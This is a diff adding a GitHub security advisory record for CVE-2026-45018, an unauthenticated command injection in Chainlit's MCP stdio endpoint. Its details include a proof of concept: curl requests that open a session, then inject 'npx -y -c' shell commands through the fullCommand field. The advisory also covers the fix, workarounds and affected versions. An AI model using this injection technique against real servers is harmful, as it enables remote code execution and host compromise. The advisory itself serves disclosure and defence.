@@ -1,0 +1,97 @@
+{
+  "id": "GHSA-w3fx-mc44-mf6j",
+  "modified": "2026-08-26T01:21:18.025641060Z",
+  "published": "2026-08-25T19:19:28Z",
+  "aliases": [
+    "CVE-2026-45018"
+  ],
+  "summary": "Chainlit has command injection via MCP stdio transport that allows unauthenticated remote code execution",
+  "details": "### Am I affected?\n\nOnly if your deployment sets `features.mcp.enabled = true` in `.chainlit/config.toml`. **MCP has been disabled by default since v2.7.0**, so most Chainlit deployments are not affected. No authentication is required: `/mcp` is reachable by any client that can open a session.\n\n### Summary\n\nWhen MCP is enabled (`features.mcp.enabled = true`), the `POST /mcp` endpoint for `stdio` transport accepts a user-controlled `fullCommand` string. The `validate_mcp_command()` function checks the executable name against a configurable allowlist but does not inspect or restrict the arguments. An attacker can pass `npx -y -c 'ARBITRARY COMMAND'` to execute arbitrary shell commands on the server with the privileges of the Chainlit process.\n\n\n### Affected / patched versions\n\n| | |\n|---|---|\n| CVE | CVE-2026-45018 |\n| Affected | `\u003e=2.4.0rc0, \u003c2.12.0` with `features.mcp.enabled = true` (introduced in PR #1977, the change that added MCP support) |\n| Patched | **2.12.0** (releasing 2026-08-25) |\n\n### Details\n\n`validate_mcp_command()` in `backend/chainlit/mcp.py` uses `shlex.split()` to parse the command string and validates only the executable name (e.g., `npx`, `uvx`) against `config.features.mcp.stdio.allowed_executables`. Arguments are returned unchecked and passed directly to `StdioServerParameters`, which spawns a subprocess.\n\nSince `npx` supports `-c` for arbitrary shell execution, `npx -y -c 'PAYLOAD'` passes the allowlist check while running whatever the attacker specifies. This gives an attacker who can reach the endpoint full control over the host.\n\nThere is a related issue in the Pydantic model: `allowed_executables` defaults to `None`, and the validation code treats `None` as \"allow everything.\" If a developer removes the `allowed_executables` line from their config, any executable can be invoked.\n\nThe `/mcp` route is registered unconditionally on the FastAPI router in every Chainlit deployment; only the runtime `features.mcp.enabled` check and (where configured) the authentication check on `/mcp` prevent exploitation.\n\n**Vulnerable code:** `backend/chainlit/mcp.py` — `validate_mcp_command()`\n**Sink:** `backend/chainlit/server.py` — `StdioServerParameters`\n\n### PoC\n\nTested against Chainlit 2.11.0 with `features.mcp.enabled = true` and default settings.\n\n1. Establish a Socket.IO session to get a valid `sessionId`:\n\n```bash\nEIO_SID=$(curl -s 'http://TARGET:8000/ws/socket.io/?EIO=4\u0026transport=polling' \\\n  | python3 -c \"import sys,json; print(json.loads(sys.stdin.read()[1:])['sid'])\")\n\ncurl -s -X POST \\\n  \"http://TARGET:8000/ws/socket.io/?EIO=4\u0026transport=polling\u0026sid=$EIO_SID\" \\\n  -d '40{\"sessionId\":\"rce-proof\",\"userEnv\":\"{}\",\"clientType\":\"webapp\"}'\n```\n\n2. Send the command injection payload:\n\n```bash\ncurl -s -X POST 'http://TARGET:8000/mcp' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"sessionId\": \"rce-proof\",\n    \"clientType\": \"stdio\",\n    \"name\": \"poc\",\n    \"fullCommand\": \"npx -y -c '\\''id \u003e /tmp/rce_proof'\\''\"\n  }'\n```\n\nThe server runs the command before the MCP handshake fails. The output of id is written to /tmp/rce_proof.\n\n### Impact\n\n**Critical.** An unauthenticated remote attacker can execute arbitrary OS commands on the server with the privileges of the Chainlit process. This can lead to full host compromise, data exfiltration, lateral movement, and installation of persistent backdoors. Any Chainlit deployment with MCP enabled is affected.\n\n### Fix\n\nChainlit 2.12.0 removes `fullCommand` from the client request entirely. stdio MCP servers are now declared by the developer in `.chainlit/config.toml` under `[[features.mcp.servers]]` and selected by name at connection time; the command string never crosses the trust boundary from client to server, so there is no command left to sanitize and no `allowed_executables` mechanism anymore. Per-server environment variables are configured via an `env` mapping on the server entry rather than supplied by the client.\n\n### Workarounds\n\nIf you cannot upgrade immediately:\n\n- Set `features.mcp.enabled = false` in `.chainlit/config.toml`. This fully prevents exploitation of this issue (and of the companion SSRF issue, CVE-2026-45019).\n- Restrict outbound process-spawning / network capability from the host running Chainlit.\n- Configure authentication (register an auth callback) so that `/mcp` requires an authenticated session. This does not fix the underlying command injection, but removes the unauthenticated attack path.\n\n### Upgrading to 2.12.0\n\n\u003e **Breaking change.** 2.12.0 changes how MCP servers are configured. If `.chainlit/config.toml` still uses the legacy `[features.mcp.sse]`, `[features.mcp.stdio]`, or `[features.mcp.streamable-http]` sections, or the `allowed_executables` setting, the application will fail to start **once MCP is enabled**, until you migrate to the new `[[features.mcp.servers]]` configuration. See the migration guide in `CHANGELOG.md` before upgrading. Deployments with `features.mcp.enabled = false` are not affected by this startup check.\n\n### Residual risk after upgrading\n\n- On deployments with no authentication configured, `/mcp` remains reachable anonymously after upgrading, because `get_current_user` returns `None` when no auth callback is registered. An anonymous client can therefore still cause **developer-configured** stdio servers to be spawned by name. Because the command itself is developer-controlled rather than attacker-supplied, this is no longer remote code execution — but it is still unauthenticated process spawning on deployments without authentication.\n- No resource limits are placed on stdio server spawning, and there is no cap on concurrent MCP sessions per client.\n\n### Credits\n\nVipin \u003cvipin@spl.team\u003e\nSPL \u003csecurity@spl.team\u003e",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "chainlit",
+        "purl": "pkg:pypi/chainlit"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.4.0rc0"
+            },
+            {
+              "fixed": "2.12.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "2.10.0",
+        "2.10.1",
+        "2.11.0",
+        "2.11.1",
+        "2.4.0",
+        "2.4.0rc0",
+        "2.4.1",
+        "2.4.2",
+        "2.4.201",
+        "2.4.3",
+        "2.4.301",
+        "2.4.302",
+        "2.4.400",
+        "2.5.5",
+        "2.6.0",
+        "2.6.1",
+        "2.6.2",
+        "2.6.3",
+        "2.6.4",
+        "2.6.5",
+        "2.6.6",
+        "2.6.7",
+        "2.6.8",
+        "2.6.9",
+        "2.7.0",
+        "2.7.1",
+        "2.7.1.1",
+        "2.7.2",
+        "2.8.0",
+        "2.8.1",
+        "2.8.2",
+        "2.8.3",
+        "2.8.4",
+        "2.8.5",
+        "2.9.0",
+        "2.9.1",
+        "2.9.2",
+        "2.9.3",
+        "2.9.4",
+        "2.9.5",
+        "2.9.6"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 2.11.1",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-w3fx-mc44-mf6j/GHSA-w3fx-mc44-mf6j.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/Chainlit/chainlit/security/advisories/GHSA-w3fx-mc44-mf6j"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Chainlit/chainlit/commit/0565fd0eccb915fce159929598b053ed79f6e0c9"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Chainlit/chainlit"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Chainlit/chainlit/releases/tag/2.12.0"
+    }
+  ]
+}
